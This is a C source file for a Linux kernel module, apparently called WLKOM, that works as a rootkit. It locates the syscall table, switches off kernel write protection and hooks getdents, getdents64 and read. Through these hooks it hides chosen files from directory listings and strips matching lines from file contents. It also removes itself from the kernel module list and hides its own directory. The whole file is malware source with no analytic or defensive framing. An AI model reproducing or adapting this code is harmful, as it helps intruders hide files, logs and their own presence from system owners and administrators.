#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include "hide.h"

/* ─── syscall table hooking ─── */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    #define KPROBE_LOOKUP 1
    #include <linux/kprobes.h>
    static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
#endif

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static unsigned long *syscall_table = NULL;

/* Hidden files list */
struct hidden_file {
    char            name[256];
    struct list_head list;
};

static LIST_HEAD(hidden_files);

/* Hidden lines list */
struct hidden_line {
    char            filename[256];
    char            pattern[256];
    struct list_head list;
};

static LIST_HEAD(hidden_lines);

/* Original syscalls */
typedef int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
typedef int (*orig_getdents_t)(unsigned int, struct linux_dirent __user *, unsigned int);
typedef long (*orig_read_t)(unsigned int, char __user *, size_t);

static orig_getdents64_t orig_getdents64 = NULL;
static orig_getdents_t   orig_getdents   = NULL;
static orig_read_t       orig_read       = NULL;

/* ─── Write protection helpers ─── */

static void disable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x00010000UL);
}

static void enable_write_protect(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 | 0x00010000UL);
}

/* ─── Lookup syscall table ─── */

static unsigned long *get_syscall_table(void)
{
#ifdef KPROBE_LOOKUP
    kallsyms_lookup_name_t lookup;
    register_kprobe(&kp);
    lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    return (unsigned long *)lookup("sys_call_table");
#else
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
#endif
}

/* ─── Hooked getdents64 ─── */

static int hooked_getdents64(unsigned int fd,
                              struct linux_dirent64 __user *dirent,
                              unsigned int count)
{
    int ret = orig_getdents64(fd, dirent, count);
    if (ret <= 0)
        return ret;

    int                           bpos = 0;
    struct hidden_file           *hf;
    char                         *buf;
    int                           new_ret = ret;

    buf = kmalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;

    if (copy_from_user(buf, dirent, ret)) {
        kfree(buf);
        return ret;
    }

    while (bpos < ret) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + bpos);
        int                    reclen = d->d_reclen;

        list_for_each_entry(hf, &hidden_files, list) {
            if (strcmp(d->d_name, hf->name) == 0) {
                memmove(buf + bpos, buf + bpos + reclen,
                        ret - bpos - reclen);
                new_ret -= reclen;
                ret     -= reclen;
                goto next;
            }
        }
        bpos += reclen;
next:;
    }

    if (copy_to_user(dirent, buf, new_ret))
        pr_warn("WLKOM: copy_to_user failed\n");
    kfree(buf);
    return new_ret;
}

/* ─── Hooked getdents (32-bit compat) ─── */

static int hooked_getdents(unsigned int fd,
                            struct linux_dirent __user *dirent,
                            unsigned int count)
{
    int ret = orig_getdents(fd, dirent, count);
    if (ret <= 0)
        return ret;

    struct hidden_file *hf;
    char               *buf;
    int                 bpos = 0;
    int                 new_ret = ret;

    buf = kmalloc(ret, GFP_KERNEL);
    if (!buf)
        return ret;

    if (copy_from_user(buf, dirent, ret)) {
        kfree(buf);
        return ret;
    }

    while (bpos < ret) {
        struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);
        int                  reclen = d->d_reclen;

        list_for_each_entry(hf, &hidden_files, list) {
            if (strcmp(d->d_name, hf->name) == 0) {
                memmove(buf + bpos, buf + bpos + reclen,
                        ret - bpos - reclen);
                new_ret -= reclen;
                ret     -= reclen;
                goto next;
            }
        }
        bpos += reclen;
next:;
    }

    if (copy_to_user(dirent, buf, new_ret))
        pr_warn("WLKOM: copy_to_user failed\n");
    kfree(buf);
    return new_ret;
}

/* ─── Hooked read (hide lines in files) ─── */

static long hooked_read(unsigned int fd, char __user *buf, size_t count)
{
    long ret = orig_read(fd, buf, count);
    if (ret <= 0)
        return ret;

    struct hidden_line *hl;
    char               *kbuf;
    char               *line_start;
    char               *line_end;
    long                new_ret = ret;

    kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    list_for_each_entry(hl, &hidden_lines, list) {
        char *pos = kbuf;
        while ((pos = strstr(pos, hl->pattern)) != NULL) {
            line_start = pos;
            while (line_start > kbuf && *(line_start - 1) != '\n')
                line_start--;
            line_end = strchr(pos, '\n');
            if (line_end)
                line_end++;
            else
                line_end = kbuf + new_ret;

            int line_len = line_end - line_start;
            memmove(line_start, line_end,
                    new_ret - (line_end - kbuf));
            new_ret -= line_len;
            kbuf[new_ret] = '\0';
        }
    }

    if (copy_to_user(buf, kbuf, new_ret))
        pr_warn("WLKOM: copy_to_user failed\n");
    kfree(kbuf);
    return new_ret;
}

/* ─── Public API ─── */

void hide_module(void)
{
    /* Remove from /sys/module and module list */
    list_del_init(&THIS_MODULE->list);

#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 4, 0)
    kobject_del(&THIS_MODULE->mkobj.kobj);
#endif
}

void hide_file(const char *name)
{
    struct hidden_file *hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if (!hf)
        return;
    strncpy(hf->name, name, sizeof(hf->name) - 1);
    list_add(&hf->list, &hidden_files);
}

void unhide_file(const char *name)
{
    struct hidden_file *hf, *tmp;
    list_for_each_entry_safe(hf, tmp, &hidden_files, list) {
        if (strcmp(hf->name, name) == 0) {
            list_del(&hf->list);
            kfree(hf);
        }
    }
}

void hide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl = kmalloc(sizeof(*hl), GFP_KERNEL);
    if (!hl)
        return;
    strncpy(hl->filename, filename, sizeof(hl->filename) - 1);
    strncpy(hl->pattern, pattern, sizeof(hl->pattern) - 1);
    list_add(&hl->list, &hidden_lines);
}

void unhide_line(const char *filename, const char *pattern)
{
    struct hidden_line *hl, *tmp;
    list_for_each_entry_safe(hl, tmp, &hidden_lines, list) {
        if (strcmp(hl->filename, filename) == 0 &&
            strcmp(hl->pattern, pattern) == 0) {
            list_del(&hl->list);
            kfree(hl);
        }
    }
}

/* ─── Init / Exit ─── */

int hide_init(void)
{
    syscall_table = get_syscall_table();
    if (!syscall_table) {
        pr_err("WLKOM hide: cannot find syscall table\n");
        return -1;
    }

    disable_write_protect();

    orig_getdents64 = (orig_getdents64_t)syscall_table[__NR_getdents64];
    orig_getdents   = (orig_getdents_t)syscall_table[__NR_getdents];
    orig_read       = (orig_read_t)syscall_table[__NR_read];

    syscall_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    syscall_table[__NR_getdents]   = (unsigned long)hooked_getdents;
    syscall_table[__NR_read]       = (unsigned long)hooked_read;

    enable_write_protect();

    /* Hide our own directory */
    hide_file("wlkom");

    pr_info("WLKOM hide: initialized\n");
    return 0;
}

void hide_exit(void)
{
    if (!syscall_table)
        return;

    disable_write_protect();

    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    syscall_table[__NR_getdents]   = (unsigned long)orig_getdents;
    syscall_table[__NR_read]       = (unsigned long)orig_read;

    enable_write_protect();

    /* Free hidden files list */
    struct hidden_file *hf, *hf_tmp;
    list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list) {
        list_del(&hf->list);
        kfree(hf);
    }

    /* Free hidden lines list */
    struct hidden_line *hl, *hl_tmp;
    list_for_each_entry_safe(hl, hl_tmp, &hidden_lines, list) {
        list_del(&hl->list);
        kfree(hl);
    }

    pr_info("WLKOM hide: exited\n");
}
